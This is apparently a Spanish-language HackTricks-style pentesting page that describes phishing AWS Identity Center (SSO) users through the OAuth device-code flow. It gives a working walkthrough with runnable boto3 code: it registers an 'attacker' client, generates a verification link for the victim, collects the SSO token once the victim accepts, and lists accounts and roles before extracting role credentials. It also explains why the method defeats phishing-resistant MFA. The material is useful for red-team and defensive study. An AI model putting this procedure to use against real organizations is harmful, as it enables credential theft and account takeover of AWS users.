# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../banners/hacktricks-training.md}}

## Phishing de Código de Dispositivo de AWS

Inicialmente propuesto en [**esta publicación de blog**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/), es posible enviar un **enlace** a un usuario que utiliza AWS SSO que, si el **usuario acepta**, el atacante podrá obtener un **token para suplantar al usuario** y acceder a todos los roles a los que el usuario puede acceder en el **Identity Center**.

Para realizar este ataque, los requisitos son:

- La víctima necesita usar **Identity Center**
- El atacante debe conocer el **subdominio** utilizado por la víctima `<victimsub>.awsapps.com/start`

Solo con la información anterior, el **atacante podrá enviar un enlace al usuario** que, si es **aceptado**, otorgará al **atacante acceso a la cuenta** del usuario de AWS.

### Ataque

1. **Encontrar el subdominio**

El primer paso del atacante es averiguar el subdominio que la empresa víctima está utilizando en su Identity Center. Esto se puede hacer a través de **OSINT** o **adivinando + BF**, ya que la mayoría de las empresas utilizarán su nombre o una variación de su nombre aquí.

Con esta información, es posible obtener la región donde se configuró el Identity Center:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Generar el enlace para la víctima y enviarlo**

Ejecuta el siguiente código para generar un enlace de inicio de sesión de AWS SSO para que la víctima pueda autenticarse.\
Para la demostración, ejecuta este código en una consola de python y no la cierres, ya que más tarde necesitarás algunos objetos para obtener el token:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
¡Envía el enlace generado a la víctima utilizando tus increíbles habilidades de ingeniería social!

3. **Espera a que la víctima lo acepte**

Si la víctima **ya estaba conectada a AWS**, solo necesitará aceptar otorgar los permisos; si no lo estaba, necesitará **iniciar sesión y luego aceptar otorgar los permisos**.\
Así es como se ve el aviso hoy en día:

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **Obtén el token de acceso SSO**

Si la víctima aceptó el aviso, ejecuta este código para **generar un token SSO suplantando al usuario**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
El token de acceso SSO es **válido por 8h**.

5. **Suplantar al usuario**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

Es divertido saber que el ataque anterior **funciona incluso si se está utilizando un "MFA ineludible" (webAuth)**. Esto se debe a que el **flujo de trabajo anterior nunca sale del dominio OAuth utilizado**. A diferencia de otros ataques de phishing donde el usuario necesita suplantar el dominio de inicio de sesión, en este caso, el flujo de trabajo del código del dispositivo está preparado para que un **código sea conocido por un dispositivo** y el usuario pueda iniciar sesión incluso en una máquina diferente. Si se acepta el aviso, el dispositivo, solo por **conocer el código inicial**, podrá **recuperar credenciales** para el usuario.

Para más información sobre esto [**consulta esta publicación**](https://mjg59.dreamwidth.org/62175.html).

### Automatic Tools

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## References

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../banners/hacktricks-training.md}}
